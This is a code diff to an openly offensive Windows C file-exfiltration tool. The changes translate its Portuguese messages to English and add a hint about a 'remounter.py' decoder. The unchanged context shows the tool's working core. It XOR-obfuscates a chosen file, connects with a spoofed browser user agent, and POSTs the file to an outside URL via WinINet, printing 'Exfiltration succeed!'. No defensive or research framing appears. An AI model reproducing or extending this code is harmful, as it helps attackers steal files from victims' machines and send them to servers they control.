@@ -13,7 +13,8 @@ void xor_buffer(char* data, DWORD len, const char* key, DWORD keylen) {
 
 int main(int argc, char* argv[]) {
     if (argc != 3) {
-        printf("Uso: %s https://url/upload arquivo_a_exfiltrar\n", argv[0]);
+        printf("Usage: %s https://url/endpoint <file to exfiltrate>\n", argv[0]);
+        printf("*----- Use remounter.py to convert it back -----*");
         return 1;
     }
 
@@ -47,21 +48,21 @@ int main(int argc, char* argv[]) {
     uc.dwUrlPathLength = sizeof(path);
 
     if (!InternetCrackUrlA(url_arg, 0, 0, &uc)) {
-        printf("[-] Erro no parsing da URL\n");
+        printf("[-] Failed for URL parsing\n");
         free(buffer);
         return 1;
     }
 
     HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (!hInternet) {
-        printf("[-] InternetOpen falhou\n");
+        printf("[-] InternetOpen failed\n");
         free(buffer);
         return 1;
     }
 
     HINTERNET hConnect = InternetConnectA(hInternet, host, uc.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConnect) {
-        printf("[-] InternetConnect falhou\n");
+        printf("[-] InternetConnect failed\n");
         InternetCloseHandle(hInternet);
         free(buffer);
         return 1;
@@ -71,7 +72,7 @@ int main(int argc, char* argv[]) {
     HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL,
         INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD, 0);
     if (!hRequest) {
-        printf("[-] HttpOpenRequest falhou\n");
+        printf("[-] HttpOpenRequest failed\n");
         InternetCloseHandle(hConnect);
         InternetCloseHandle(hInternet);
         free(buffer);
@@ -82,7 +83,7 @@ int main(int argc, char* argv[]) {
         printf("[-] HttpSendRequest falhou (%lu)\n", GetLastError());
     }
     else {
-        printf("[+] Exfiltração enviada com sucesso!\n");
+        printf("[+] Exfiltration succeed!\n");
     }
 
     InternetCloseHandle(hRequest);
